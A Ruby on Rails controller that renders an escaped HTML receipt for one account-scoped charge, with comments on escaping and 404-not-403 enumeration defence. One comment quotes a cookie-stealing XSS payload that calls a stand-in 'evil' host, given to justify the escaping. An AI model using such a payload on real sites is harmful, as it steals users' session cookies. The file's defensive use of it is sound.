module V1
  # Charges: what a customer was charged, and the receipt for it.
  #
  # ## Why HTML, and why rendered here rather than in a view
  #
  # A receipt is a page a person reads, not a resource a program consumes, so it
  # is the one response on `/v1` that is not JSON and not `application/problem+json`.
  # Every **error** on this route is still problem+json by way of
  # `ApplicationController`, which is the rule that matters: a caller that gets a
  # 404 here gets the same seven keys it gets everywhere else.
  #
  # The markup is built in this file rather than in `app/views` for two reasons,
  # and the second is the real one. There is exactly one consumer of this document
  # and it is a browser showing it to the person who paid; a template would add a
  # layout, a partial and a lookup path to render four lines of fact. And the
  # escaping is the load-bearing part — **every interpolated value is escaped**,
  # without exception — so it belongs next to the claim that it is happening,
  # where a reviewer reads it.
  #
  # ## Every interpolated value is escaped, and that is not tidiness
  #
  # `charge.description` is **the processor's own text**: an invoice line item's
  # description, which this service never validates and cannot. A Stripe account
  # with a price called `<script>fetch('//evil/'+document.cookie)</script>`
  # would otherwise put that script in a page served from cafaye's own origin,
  # inside a page a customer opens precisely when they trust us most. The same
  # applies to every id rendered here.
  #
  # This is a different boundary from the telemetry one (`AGENTS.md`,
  # Observability) and it deserves to be named separately: the canary suite proves
  # a caller's input never reaches a *span*. This is the same class of leak into a
  # *response body*, and it needed its own guard because nothing else in the
  # repository renders a processor's free text back to a human.
  #
  # ## Scoped by the caller's account
  #
  # The row is resolved through `Charge.for_account`, so a uuid naming another
  # account's charge is a **404** — byte for byte the answer a uuid naming nothing
  # gets. Not 403: a 403 says "this exists, you may not have it", which is an
  # enumeration oracle for anyone walking ids. Absence, never refusal
  # (`AGENTS.md`, Contracts).
  class ChargesController < BaseController
    # The whole stylesheet, inline, as a constant rather than a string in the
    # method body: it is a fixed string with no interpolation, so Ruby folds it
    # into a literal and the heredoc above stays readable. A stylesheet is not
    # worth an asset pipeline for four rules.
    STYLE = <<~CSS.freeze
      body { font-family: system-ui, sans-serif; max-width: 34rem; margin: 3rem auto;
             padding: 0 1rem; color: #1a1a1a; line-height: 1.5; }
      h1 { font-size: 1.25rem; margin: 0 0 1.5rem; }
      .amount { font-size: 2rem; font-weight: 600; margin: 0 0 1.5rem; }
      .row { display: flex; justify-content: space-between; gap: 1rem;
             padding: 0.4rem 0; border-bottom: 1px solid #e5e5e5; font-size: 0.9rem; }
      .label { color: #666; }
    CSS

    # GET /v1/charges/{id}
    #
    # The receipt for one charge. One charge, not a list: an index over charges is
    # an obvious next request and it is deliberately not here, because a list of
    # money without a date range is a page nobody chose to read and a list nobody
    # can scope safely. One id, one account, one receipt.
    def show
      charge = Charge.for_account(current_account_id).find_by(id: uuid_param!(params[:id]))
      raise ActiveRecord::RecordNotFound unless charge

      render html: receipt_html(charge), content_type: "text/html"
    end

    private
      # The receipt document. Deliberately self-contained: no stylesheet, no
      # script, no external asset, no image. A receipt has to survive being
      # printed, saved and emailed, and every one of those is a place a relative
      # URL quietly stops resolving.
      def receipt_html(charge)
        <<~HTML
          <!DOCTYPE html>
          <html lang="en">
          <head>
            <meta charset="utf-8">
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <title>#{escape("Receipt — #{charge.description}")}</title>
            <style>#{STYLE}</style>
          </head>
          <body>
            <h1>Receipt</h1>
            <p class="amount">#{escape(formatted_amount(charge))}</p>
            #{row("Description", charge.description)}
            #{row("Paid", charge.paid_at&.utc&.strftime("%B %-d, %Y"))}
            #{row("Charge id", charge.processor_charge_id)}
            #{row("Subscription", charge.subscription_id)}
            #{row("Receipt id", charge.id)}
          </body>
          </html>
        HTML
      end

      def row(label, value)
        # An absent value renders as an empty row rather than as a blank label:
        # a receipt that says "Subscription:" and nothing is worse than one that
        # does not have the row.
        return "" if value.blank?

        %(<p class="row"><span class="label">#{escape(label)}</span><span>#{escape(value)}</span></p>)
      end

      # The amount as a person reads money, from integer minor units.
      #
      # `Money#to_major` gives the number and `#exponent` gives how many decimal
      # places this currency has, so `1900` USD is `19.00` and `1900` JPY is
      # `1900`. Hardcoding two places would show a yen receipt with a decimal
      # point it has no minor unit for, which is the kind of small wrongness that
      # is only noticed by the customer.
      #
      # The currency is spelled out beside it rather than assumed, because a bare
      # number on a receipt is ambiguous by construction.
      def formatted_amount(charge)
        money = Money.new(charge.amount, charge.currency)
        "#{format("%.#{money.exponent}f", money.to_major)} #{charge.currency}"
      end

      def escape(value)
        ERB::Util.html_escape(value.to_s)
      end
  end
end
